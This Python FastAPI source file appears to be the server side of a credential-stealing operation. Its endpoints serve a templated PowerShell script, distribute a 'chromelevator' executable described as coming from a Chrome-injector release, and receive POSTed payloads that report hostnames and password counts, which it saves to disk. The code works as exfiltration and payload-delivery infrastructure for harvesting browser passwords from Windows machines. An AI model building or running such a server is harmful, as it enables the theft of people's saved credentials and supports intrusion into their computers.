import json
import os
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from fastapi import FastAPI, HTTPException, Request
from fastapi.responses import FileResponse, PlainTextResponse


app = FastAPI(title="Remote Scripts API")

SCRIPT_PATH = Path(__file__).with_name("windows_script.ps1")
BIN_DIR = Path(__file__).with_name("bin")
DATA_DIR = Path(os.getenv("DATA_DIR", "/app/data"))
PAYLOAD_HOSTNAME = os.getenv("PAYLOAD_HOSTNAME", "localhost:8001")
API_BASE = f"http://{PAYLOAD_HOSTNAME}"
PAYLOAD_URL = f"{API_BASE}/payload"


def save_payload(payload: dict[str, Any]) -> dict[str, str]:
    DATA_DIR.mkdir(parents=True, exist_ok=True)

    timestamp = datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ")
    hostname = payload.get("hostname", "unknown")
    safe_hostname = "".join(char if char.isalnum() or char in "-_" else "_" for char in hostname)

    json_path = DATA_DIR / f"{timestamp}_{safe_hostname}.json"
    json_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")

    return {"json": str(json_path)}


def render_windows_script() -> str:
    return (
        SCRIPT_PATH.read_text(encoding="utf-8")
        .replace("__API_BASE__", API_BASE)
        .replace("__PAYLOAD_URL__", PAYLOAD_URL)
    )


@app.get("/windows-script", response_class=PlainTextResponse)
async def get_windows_script() -> PlainTextResponse:
    return PlainTextResponse(
        render_windows_script(),
        media_type="text/plain; charset=utf-8",
    )


@app.get("/chromelevator")
async def get_chromelevator(arch: str = "x64") -> FileResponse:
    arch = arch.lower()
    if arch not in {"x64", "arm64"}:
        raise HTTPException(status_code=400, detail="arch must be x64 or arm64")

    binary_path = BIN_DIR / f"chromelevator_{arch}.exe"
    if not binary_path.is_file():
        raise HTTPException(
            status_code=404,
            detail=(
                f"Place chromelevator_{arch}.exe in app/bin/ "
                "(extract from xaitax/chrome-injector release zip)"
            ),
        )

    return FileResponse(
        binary_path,
        media_type="application/octet-stream",
        filename="chromelevator.exe",
    )


@app.post("/payload")
async def receive_payload(request: Request) -> dict[str, Any]:
    payload = await request.json()
    saved_files = save_payload(payload)

    chromelevator = payload.get("chromelevator") if isinstance(payload.get("chromelevator"), dict) else {}

    return {
        "received": True,
        "password_count": payload.get("passwordCount", 0),
        "chromelevator": chromelevator,
        "saved_files": saved_files,
    }
